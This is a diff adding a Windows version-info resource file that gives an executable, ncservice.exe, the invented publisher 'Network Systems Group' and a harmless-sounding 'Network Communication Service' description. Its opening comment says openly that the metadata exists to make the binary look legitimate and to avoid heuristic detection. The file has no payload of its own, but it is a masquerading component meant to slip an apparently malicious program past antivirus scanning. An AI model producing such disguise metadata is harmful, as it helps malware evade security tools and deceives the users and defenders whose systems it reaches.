@@ -1,0 +1,33 @@
+// Windows version info resource
+// This gives the binary legitimate-looking metadata to avoid heuristic detection.
+
+#include <windows.h>
+
+VS_VERSION_INFO VERSIONINFO
+FILEVERSION     1,0,0,0
+PRODUCTVERSION  1,0,0,0
+FILEFLAGSMASK   0x3fL
+FILEFLAGS       0x0L
+FILEOS          VOS_NT_WINDOWS32
+FILETYPE        VFT_APP
+FILESUBTYPE     0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904B0"
+        BEGIN
+            VALUE "CompanyName",      "Network Systems Group\0"
+            VALUE "FileDescription",  "Network Communication Service\0"
+            VALUE "FileVersion",      "1.0.0.0\0"
+            VALUE "InternalName",     "ncservice\0"
+            VALUE "LegalCopyright",   "Copyright (C) 2024\0"
+            VALUE "OriginalFilename", "ncservice.exe\0"
+            VALUE "ProductName",      "Network Communication Service\0"
+            VALUE "ProductVersion",   "1.0.0\0"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x409, 0x04B0
+    END
+END
